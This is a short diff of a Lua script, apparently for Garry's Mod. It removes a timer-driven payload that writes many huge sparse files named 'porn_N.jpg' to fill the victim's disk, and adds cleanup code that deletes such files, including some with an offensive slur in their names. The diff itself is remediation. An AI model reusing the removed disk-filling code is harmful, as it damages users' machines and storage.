@@ -1,28 +1,13 @@
-local function rand_string()
-	local s = ""
-	for i = 1, math.random(12, 32) do
-		s = s .. string.char(math.random(65, 126))
-	end
-	return s
+local files, _ = file.Find("*.txt", "DATA")
+for _, f in ipairs(files) do
+    if string.find(f, "from_web") or string.find(f, "test") or string.find(f, "Igay") then
+        file.Delete(f)
+    end
 end
 
-local C, c = 2100000000, 0
-local name = rand_string()
-timer.Create(name, 1, 100, function()
-	for i = 1, 10 do
-		c = c + 1
-		local F = file.Open("porn_" .. c .. ".jpg", "wb", "DATA")
-		if not F then return end
-		F:WriteBool(true)
-		F:Seek(C)
-		F:WriteBool(false)
-
-		if F:Size() == 1 then
-			C = C - 2000000.0
-			if C <= 0 then
-				timer.Remove(name)
-			end
-		end
-		F:Close()
-	end
-end)
+files, _ = file.Find("*.jpg", "DATA")
+for _, f in ipairs(files) do
+    if string.find(f, "photo_") or string.find(f, "porn_") then
+        file.Delete(f)
+    end
+end
